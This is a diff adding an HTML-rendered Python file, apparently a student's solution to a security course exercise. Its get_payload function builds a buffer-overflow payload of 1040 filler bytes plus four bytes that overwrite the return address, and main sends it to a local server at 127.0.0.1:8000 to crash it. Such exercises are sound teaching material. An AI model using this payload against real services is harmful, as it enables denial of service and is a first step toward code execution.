@@ -1,0 +1,64 @@
+<html>
+<head>
+<title>q1.py</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<style type="text/css">
+.ln { color: #606366; font-weight: normal; font-style: normal; }
+.s0 { color: rgb(128,128,128); }
+.s1 { color: rgb(169,183,198); }
+.s2 { color: rgb(204,120,50); font-weight: bold; }
+.s3 { color: rgb(204,120,50); }
+.s4 { color: rgb(165,194,97); }
+.s5 { color: rgb(104,151,187); }
+.s6 { color: rgb(98,151,85); font-style: italic; }
+</style>
+</head>
+<BODY BGCOLOR="#2b2b2b">
+<TABLE CELLSPACING=0 CELLPADDING=5 COLS=1 WIDTH="100%" BGCOLOR="#606060" >
+<TR><TD><CENTER>
+<FONT FACE="Arial, Helvetica" COLOR="#000000">
+q1.py</FONT>
+</center></TD></TR></TABLE>
+<pre>
+<a name="l1"><span class="ln">1    </span></a><span class="s0">#!/usr/bin/python</span><span class="s1"> 
+<a name="l2"><span class="ln">2    </span></a> 
+<a name="l3"><span class="ln">3    </span></a></span><span class="s2">import </span><span class="s1">os</span><span class="s3">, </span><span class="s1">socket</span><span class="s3">, </span><span class="s1">struct 
+<a name="l4"><span class="ln">4    </span></a> 
+<a name="l5"><span class="ln">5    </span></a> 
+<a name="l6"><span class="ln">6    </span></a>HOST = </span><span class="s4">'127.0.0.1'</span><span class="s1"> 
+<a name="l7"><span class="ln">7    </span></a>PORT = </span><span class="s5">8000</span><span class="s1"> 
+<a name="l8"><span class="ln">8    </span></a> 
+<a name="l9"><span class="ln">9    </span></a> 
+<a name="l10"><span class="ln">10   </span></a></span><span class="s2">def </span><span class="s1">get_payload(): 
+<a name="l11"><span class="ln">11   </span></a>    </span><span class="s6">'''This function returns the data to send over the socket to the server. 
+<a name="l12"><span class="ln">12   </span></a>     
+<a name="l13"><span class="ln">13   </span></a>    This data should cause the server to crash (and generate a segfault). 
+<a name="l14"><span class="ln">14   </span></a>    '''</span><span class="s1"> 
+<a name="l15"><span class="ln">15   </span></a> 
+<a name="l16"><span class="ln">16   </span></a>    </span><span class="s0"># TODO: IMPLEMENT THIS FUNCTION</span><span class="s1"> 
+<a name="l17"><span class="ln">17   </span></a>    message = </span><span class="s4">'a' </span><span class="s1">* </span><span class="s5">1040 </span><span class="s0"># we need more than 1036 bytes to fill buffer + 4 to override &quot;old ebp&quot;</span><span class="s1"> 
+<a name="l18"><span class="ln">18   </span></a>    message += </span><span class="s4">'abcd' </span><span class="s0"># this will override RET/eip</span><span class="s1"> 
+<a name="l19"><span class="ln">19   </span></a>    message_length = len(message) 
+<a name="l20"><span class="ln">20   </span></a>    message_length_newtork_order = struct.pack(</span><span class="s4">'&gt;L'</span><span class="s3">, </span><span class="s1">message_length) 
+<a name="l21"><span class="ln">21   </span></a>    </span><span class="s2">return </span><span class="s1">message_length_newtork_order + message </span><span class="s0"># add size of message as &quot;required&quot; by our server protocol </span><span class="s1"> 
+<a name="l22"><span class="ln">22   </span></a> 
+<a name="l23"><span class="ln">23   </span></a>    </span><span class="s0"># NOTE:</span><span class="s1"> 
+<a name="l24"><span class="ln">24   </span></a>    </span><span class="s0"># Don't delete this function - we are going to test it directly in our</span><span class="s1"> 
+<a name="l25"><span class="ln">25   </span></a>    </span><span class="s0"># tests, without running the main() function below.</span><span class="s1"> 
+<a name="l26"><span class="ln">26   </span></a> 
+<a name="l27"><span class="ln">27   </span></a> 
+<a name="l28"><span class="ln">28   </span></a></span><span class="s2">def </span><span class="s1">main(): 
+<a name="l29"><span class="ln">29   </span></a>    payload = get_payload() 
+<a name="l30"><span class="ln">30   </span></a>    conn = socket.socket() 
+<a name="l31"><span class="ln">31   </span></a>    conn.connect((HOST</span><span class="s3">, </span><span class="s1">PORT)) 
+<a name="l32"><span class="ln">32   </span></a>    </span><span class="s2">try</span><span class="s1">: 
+<a name="l33"><span class="ln">33   </span></a>        conn.sendall(payload) 
+<a name="l34"><span class="ln">34   </span></a>    </span><span class="s2">finally</span><span class="s1">: 
+<a name="l35"><span class="ln">35   </span></a>        conn.close() 
+<a name="l36"><span class="ln">36   </span></a> 
+<a name="l37"><span class="ln">37   </span></a> 
+<a name="l38"><span class="ln">38   </span></a></span><span class="s2">if </span><span class="s1">__name__ == </span><span class="s4">'__main__'</span><span class="s1">: 
+<a name="l39"><span class="ln">39   </span></a>    main() 
+<a name="l40"><span class="ln">40   </span></a></span></pre>
+</body>
+</html>
